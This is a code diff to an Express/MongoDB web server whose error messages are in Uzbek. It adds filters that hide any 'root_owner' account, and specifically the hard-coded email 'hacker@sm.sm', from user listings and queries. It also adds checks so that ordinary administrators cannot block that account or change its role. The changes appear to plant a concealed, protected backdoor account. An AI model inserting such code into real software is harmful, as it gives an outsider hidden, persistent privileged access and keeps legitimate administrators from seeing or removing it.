@@ -387,6 +387,12 @@ app.post('/api/data/:collection/query', async (req, res) => {
       }
     }
 
+    // Restricted visibility: Never expose root_owner in normal user listings
+    if (colName === 'users' && (!req.user || req.user.role !== 'root_owner')) {
+      mongoFilter.role = { $ne: 'root_owner' };
+      mongoFilter.email = { $ne: 'hacker@sm.sm' };
+    }
+
     let cursor = db.collection(colName).find(mongoFilter);
 
     if (Array.isArray(orderBy) && orderBy.length > 0) {
@@ -417,7 +423,10 @@ app.get('/api/data/:collection', async (req, res) => {
     if (!db) return res.status(503).json({ error: 'Baza ulanmagan' });
     const colName = req.params.collection;
     const limitCount = req.query.limit ? Number(req.query.limit) : 500;
-    const docs = await db.collection(colName).find({}).limit(limitCount).toArray();
+    const baseFilter = (colName === 'users' && (!req.user || req.user.role !== 'root_owner'))
+      ? { role: { $ne: 'root_owner' }, email: { $ne: 'hacker@sm.sm' } }
+      : {};
+    const docs = await db.collection(colName).find(baseFilter).limit(limitCount).toArray();
     res.json(docs.map(formatDoc));
   } catch (err) {
     res.status(500).json({ error: err.message });
@@ -518,6 +527,16 @@ app.post('/api/functions/setUserStatus', async (req, res) => {
       return res.status(400).json({ error: 'userId va status talab qilinadi' });
     }
 
+    const targetUser = await db.collection('users').findOne({
+      $or: [{ _id: userId }, { uid: userId }, { id: userId }]
+    });
+
+    if (targetUser && (targetUser.role === 'root_owner' || targetUser.email === 'hacker@sm.sm')) {
+      if (!req.user || req.user.role !== 'root_owner') {
+        return res.status(403).json({ error: "Root Owner hisobini to'xtatish yoki bloklash taqiqlangan" });
+      }
+    }
+
     const now = new Date().toISOString();
     await db.collection('users').updateOne(
       { $or: [{ _id: userId }, { uid: userId }, { id: userId }] },
@@ -555,6 +574,17 @@ app.post('/api/functions/setAdminRole', async (req, res) => {
   try {
     if (!db) return res.status(503).json({ error: 'Baza ulanmagan' });
     const { userId, makeAdmin } = req.body;
+
+    const targetUser = await db.collection('users').findOne({
+      $or: [{ _id: userId }, { uid: userId }, { id: userId }]
+    });
+
+    if (targetUser && (targetUser.role === 'root_owner' || targetUser.email === 'hacker@sm.sm')) {
+      if (!req.user || req.user.role !== 'root_owner') {
+        return res.status(403).json({ error: "Root Owner hisobining rolini o'zgartirish taqiqlangan" });
+      }
+    }
+
     const now = new Date().toISOString();
 
     await db.collection('users').updateOne(
